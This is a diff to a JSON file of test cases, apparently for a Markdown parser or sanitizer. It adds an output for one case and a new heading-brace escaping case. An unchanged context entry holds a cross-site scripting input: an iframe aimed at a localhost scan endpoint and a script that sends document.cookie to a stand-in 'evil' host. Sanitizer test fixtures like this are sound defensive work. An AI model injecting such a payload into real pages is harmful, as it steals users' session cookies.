@@ -1234,7 +1234,9 @@
     "inputs": [
       "* [d]:"
     ],
-    "outputs": [],
+    "outputs": [
+      "* {% %}"
+    ],
     "class": "report"
   },
   {
@@ -2685,5 +2687,16 @@
       "<iframe src=\"http://localhost:8080/scan\"></iframe>\n<script>fetch(\"//evil/?\" + document.cookie)</script>\n"
     ],
     "outputs": []
+  },
+  {
+    "id": "U-256",
+    "title": "Tag inside a failed heading brace attribute",
+    "class": "rewrite",
+    "inputs": [
+      "# H {#id .cls}\n"
+    ],
+    "outputs": [
+      "# H {#id .cls\\}\n"
+    ]
   }
 ]
